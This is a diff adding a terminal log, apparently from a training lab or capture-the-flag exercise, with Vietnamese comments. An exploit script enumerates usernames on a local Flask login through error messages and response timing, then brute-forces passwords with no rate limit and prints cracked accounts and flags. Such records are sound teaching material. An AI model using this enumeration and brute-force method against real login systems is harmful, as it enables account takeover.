@@ -1,0 +1,39 @@
+$ python3 app.py        # terminal 1, lang nghe 127.0.0.1:8041
+ * Serving Flask app 'app'
+ * Running on http://127.0.0.1:8041
+Press CTRL+C to quit
+
+$ python3 exploit.py     # terminal 2
+[*] Buoc 1: enumeration qua noi dung thong bao loi
+    root           -> Unknown user
+    administrator  -> Unknown user
+    admin          -> Invalid password <= HOP LE
+    guest          -> Unknown user
+    test           -> Unknown user
+    john.doe       -> Invalid password <= HOP LE
+    alice          -> Invalid password <= HOP LE
+    bob            -> Unknown user
+    support        -> Unknown user
+    => user hop le (theo message): ['admin', 'john.doe', 'alice']
+
+[*] Buoc 2: xac nhan bang timing (trung binh 5 lan/moi user)
+    john.doe       median=0.1249s
+    alice          median=0.1244s
+    admin          median=0.1242s
+    guest          median=0.0044s
+    bob            median=0.0035s
+    root           median=0.0035s
+    test           median=0.0035s
+    administrator  median=0.0034s
+    support        median=0.0033s
+    => user cham bat thuong (ton tai): ['admin', 'john.doe', 'alice']
+
+[*] Buoc 3: brute force mat khau (khong rate limit/lockout)
+    [+] CRACKED admin:Password123  flag=FLAG{4.1_brute_force_no_rate_limit}
+    [+] CRACKED john.doe:letmein  flag=FLAG{4.1_brute_force_no_rate_limit}
+    [+] CRACKED alice:sunshine  flag=FLAG{4.1_brute_force_no_rate_limit}
+
+[+] Chiem duoc tai khoan: {'admin': 'Password123', 'john.doe': 'letmein', 'alice': 'sunshine'}
+
+# Ghi chu doc log server: user khong ton tai tra 401 ngay, user ton tai cham ~0.12s
+# vi server moi goi check_password. Day la timing side-channel that trong transcript.
